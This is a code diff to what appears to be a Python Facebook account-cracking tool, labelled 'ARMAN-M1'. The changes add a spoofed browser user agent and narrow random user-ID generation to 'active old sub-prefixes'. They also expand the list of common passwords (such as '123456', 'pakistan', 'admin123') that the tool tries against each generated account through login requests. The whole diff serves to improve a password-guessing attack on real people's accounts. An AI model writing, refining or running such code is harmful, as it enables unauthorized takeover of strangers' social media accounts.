@@ -107,7 +107,8 @@ W = '\x1b[1;37m'
 def window1():
     fb_ua_list = [
         "Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.25.115;]",
-        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.037) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/FBIOS;FBAV/425.0.0.12.34;]"
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.037) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/FBIOS;FBAV/425.0.0.12.34;]",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     ]
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
@@ -262,8 +263,9 @@ def series_2006_2008():
     limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
     linex()
     for _ in range(int(limit)):
-        prefix = random.choice(['10000000', '10000001', '10000002', '10000003', '10000004', '10000005', '10000006'])
-        uid = prefix + ''.join(random.choices('0123456789', k=7))
+        # Optimized range targeting actual active old sub-prefixes
+        prefix = random.choice(['100000000', '100000001', '100000002', '100000003', '100000004'])
+        uid = prefix + ''.join(random.choices('0123456789', k=6))
         user.append(uid)
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
@@ -285,7 +287,8 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789', '12345', 'password', 'khan123', '112233', '123321', '786786', 'pakistan'):
+        # Expanded vintage password dictionary for older accounts
+        for pw in ('123456', '1234567', '12345678', '123456789', 'password', '112233', '123321', '786786', 'pakistan', '12345', 'khan123', 'admin123'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -353,4 +356,4 @@ if __name__ == '__main__':
     result = check_key()
     if result:
         BNG_71_()
-
+        
